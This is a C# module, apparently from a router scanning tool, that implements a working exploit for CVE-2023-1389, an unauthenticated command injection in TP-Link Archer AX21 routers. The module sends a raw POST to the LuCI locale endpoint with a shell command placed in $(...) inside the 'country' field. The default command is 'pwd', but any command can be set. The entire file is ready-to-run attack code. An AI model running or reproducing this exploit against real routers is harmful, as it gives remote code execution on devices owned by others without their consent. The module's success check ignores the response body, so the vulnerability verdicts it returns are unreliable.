namespace RouterScanner.Services.VulHub;

/// <summary>
/// TP-Link Archer AX21 （AX1800） 中未经身份验证的命令注入
/// <br/><see cref="https://www.exploit-db.com/exploits/51677"/>
/// </summary>
public sealed class CVE_2023_1389 : RouterVulHubBase<CVE_2023_1389>, IRouterVulHub
{
    public string CVE => "CVE-2023-1389";
    public string VulType => "命令注入";
    public string Production => "TP-Link";
    public List<string> Version => ["AX21", "AX1800"];

    public CVE_2023_1389()
    {
        Payload.Cmd = "pwd";
    }

    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
            Host: {Host}
            Content-Type: application/x-www-form-urlencoded

            operation=write&country=$({Payload.Cmd})
            """;
        var resp = await Http.SendAsync(rawText, SSL, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }

        var result = await resp.Content.ReadAsStringAsync(cancellationToken).ConfigureAwait(false);
        return OK();
    }
}